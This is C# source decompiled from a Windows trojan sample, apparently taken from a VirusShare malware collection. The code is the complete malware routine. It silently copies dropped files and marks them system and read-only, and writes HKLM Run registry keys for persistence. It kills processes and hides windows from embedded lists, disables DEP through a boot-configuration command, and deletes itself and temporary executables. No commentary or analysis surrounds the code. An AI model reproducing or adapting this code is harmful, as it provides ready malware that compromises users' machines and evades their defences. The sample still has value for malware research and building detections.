// Decompiled with JetBrains decompiler
// Type: Pack.Module1
// Assembly: Pack, Version=9.16.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 11AAA710-7A99-45F2-A2D1-36D46FA86CE1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Small.v-afd21cae783785fb352427e1910e60ef30a550367d955a89cafed04f93693c78.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Pack.My;
using System;
using System.Diagnostics;
using System.IO;

namespace Pack
{
  [StandardModule]
  internal sealed class Module1
  {
    private static string nircmd = "nircmdc.exe";
    private static int PID = Process.GetCurrentProcess().Id;

    [STAThread]
    public static void Main()
    {
      Module1.ShellExec(Module1.nircmd + " shellcopy \"~$nir.exefile$\" \"~$folder.system$\" yestoall noerrorui silent", Wait: true, Timeout: 10000);
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(FileSystem.CurDir() + "\\" + Module1.nircmd);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Module1.HideAll();
      Module1.ShellExec(Module1.nircmd + " waitprocess /" + Conversions.ToString(Module1.PID) + " cmdwait 1000 filldelete *.* ");
      Module1.ShellExec("bacdedit /set {current} nx AlwaysOff", Wait: true, Timeout: 10000);
      Module1.TerminateProcess(Strings.Split(Pack.My.Resources.Resources.ProcList2, "\r\n"));
      Module1.CopyFile();
      Module1.ShellExec(Module1.nircmd + " execmd del \"%TEMP%\\*.exe\"", Wait: true, Timeout: 10000);
      Module1.HideAll();
    }

    public static void CopyFile()
    {
      string[] strArray1 = Strings.Split(Pack.My.Resources.Resources.FileList, "\r\n");
      int index = 0;
      while (index < strArray1.Length)
      {
        string str1 = strArray1[index];
        if (Operators.CompareString(str1, "", false) != 0)
        {
          string[] strArray2 = Strings.Split(str1, ",");
          string str2 = strArray2[0];
          string str3 = strArray2[1];
          string str4 = strArray2[2];
          Module1.ShellExec(Module1.nircmd + " execmd attrib -h -r -s \"" + str3 + "*.*\" ", Wait: true, Timeout: 10000);
          Module1.ShellExec(Module1.nircmd + " shellcopy \"" + str2 + "\" \"" + str3 + "\" yestoall noerrorui silent", Wait: true, Timeout: 10000);
          Module1.ShellExec(Module1.nircmd + " execmd attrib +r +s \"" + str3 + str2 + "\" ", Wait: true, Timeout: 10000);
          Module1.ShellExec(Module1.nircmd + " regsetval sz \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" \"" + str4 + "\" \"" + str3 + str2 + "\" ", Wait: true, Timeout: 10000);
          Module1.ShellExec(Module1.nircmd + " filldelete \"" + str2 + "\"", Wait: true, Timeout: 10000);
        }
        checked { ++index; }
      }
    }

    public static void DeleteFile(string filepath) => Module1.ShellExec(Module1.nircmd + " filldelete \"" + filepath + "\" ", Wait: true, Timeout: 10000);

    public static void HideAll()
    {
      Module1.TerminateProcess(Strings.Split(Pack.My.Resources.Resources.ProcList, "\r\n"));
      Module1.HideWin(Strings.Split(Pack.My.Resources.Resources.WinList, "\r\n"));
    }

    public static void ShellExec(string PathName, AppWinStyle style = AppWinStyle.Hide, bool Wait = false, int Timeout = -1)
    {
      try
      {
        Interaction.Shell(PathName, style, Wait, Timeout);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static object HideWin(string[] Titles)
    {
      if (!new FileInfo(Module1.nircmd).Exists)
        return (object) false;
      string[] strArray = Titles;
      int index = 0;
      while (index < strArray.Length)
      {
        string str = strArray[index];
        Module1.ShellExec(Module1.nircmd + " win hide ititle \"" + str + "\" ", Wait: true, Timeout: 10000);
        checked { ++index; }
      }
      return (object) true;
    }

    public static void TerminateProcess(string[] Ps)
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        int index1 = 0;
        while (index1 < processes.Length)
        {
          Process process = processes[index1];
          string[] strArray = Ps;
          int index2 = 0;
          while (index2 < strArray.Length)
          {
            string Left = strArray[index2];
            if (Operators.CompareString(Left, "", false) != 0 & process.ProcessName.ToLower().StartsWith(Left.ToLower()))
              process.Kill();
            checked { ++index2; }
          }
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
